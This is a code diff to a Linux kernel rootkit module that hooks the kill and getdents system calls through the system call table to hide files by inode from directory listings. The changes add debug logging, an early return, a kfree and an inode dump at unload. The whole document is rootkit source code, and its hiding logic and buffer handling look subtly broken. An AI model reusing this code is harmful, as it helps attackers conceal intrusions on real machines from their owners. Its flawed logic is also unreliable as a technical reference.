@@ -64,6 +64,7 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 		toAdd->inode = pid;
 		INIT_LIST_HEAD(&toAdd->list);
 		list_add_tail(&toAdd->list,&hidden_files);
+		printk(KERN_INFO "Adding inode %i\n",pid);
 		return 0;
 	}
 
@@ -94,6 +95,8 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 	struct linux_dirent toWorkWith;
 	struct linux_dirent *forUser;
 
+	printk(KERN_INFO "Running hacked_getdents\n");
+
 	// check user space access and allocate kernel space linux_dirent
 	if (!access_ok(VERIFY_READ,dirp,count))
 		return -1;
@@ -103,15 +106,21 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 	// run real getdent and check result for files to hide
 	actual_result = (*orig_getdents)(fd,dirp,count);
 	if (actual_result > 0) { // actually read some bytes
+		printk(KERN_INFO "Checking dirp\n");
 		for (i = 0; i < actual_result / sizeof(struct linux_dirent); i++) {
-			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent))) // (dirp + i)->d_reclen))
+			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent)))
 				return -1;
 			list_for_each_entry(ptr,&hidden_files,list) {
-				if (toWorkWith.d_ino == ptr->inode)
+				if (toWorkWith.d_ino == ptr->inode) {
+					printk(KERN_INFO "Found file to hide\n");
 					continue;
+				}
 			}
 			*forUser++ = toWorkWith;
 		}
+	}
+	else {
+		return actual_result;
 	}
 
 	// copy linux_dirent * to user space
@@ -119,6 +128,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 		return -1;
 	if (copy_to_user(dirp,forUser,count))
 		return -1;
+	kfree(forUser);
 
 	// return actual result
 	return actual_result;
@@ -140,9 +150,9 @@ int rootkit_init(void) {
 
 void rootkit_exit(void) {
 	struct hidden_file *ptr, *next;
-	//list_for_each_entry(ptr,&hidden_files,list) {
-	//	printk(KERN_INFO "Inode: %d\n",ptr->inode);
-	//}
+	list_for_each_entry(ptr,&hidden_files,list) {
+		printk(KERN_INFO "Inode: %d\n",ptr->inode);
+	}
 
 	GPF_DISABLE;
 	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
